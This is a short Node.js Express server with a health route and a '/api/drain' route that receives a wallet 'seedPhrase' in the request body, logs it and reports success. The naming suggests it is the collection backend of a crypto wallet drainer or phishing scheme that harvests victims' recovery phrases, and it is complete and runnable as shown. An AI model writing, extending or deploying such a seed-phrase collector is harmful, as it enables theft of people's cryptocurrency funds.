const express = require('express');
const app = express();
const port = process.env.PORT || 8080;
app.use(express.json());
app.get('/api/health', (req, res) => res.json({ status: 'ok' }));
app.post('/api/drain', (req, res) => {
    console.log('Seed:', req.body.seedPhrase);
    res.json({ success: true });
});
app.listen(port, '0.0.0.0', () => console.log('✅ Running on port ' + port));
